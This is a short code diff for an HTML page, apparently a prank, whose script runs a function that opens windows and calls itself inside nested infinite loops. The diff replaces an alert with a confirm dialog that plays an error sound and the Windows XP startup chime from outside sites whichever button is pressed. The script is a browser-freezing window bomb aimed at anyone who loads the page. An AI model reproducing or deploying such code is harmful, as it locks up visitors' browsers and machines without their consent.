@@ -3,10 +3,18 @@
     <link rel="stylesheet" href="../KatsuProblemsGuide/sources/css/dark.css">
 </head>
 <html><script>
+    var error = new Audio('https://www.myinstants.com/media/sounds/erro.mp3');
+    var xp = new Audio ('https://www.winhistory.de/more/winstart/mp3/winxp.mp3');
     function infiny() {
         for (var i=0; i<Infinity; i++) {
             open("./.");
-            alert("Error uwu");
+            if (confirm("Oh no!")) {
+                error.play();
+                xp.play();
+            } else {
+                error.play();
+                xp.play();
+            }
             for (var i=0; i<Infinity; i++) {
                 infiny();
             }
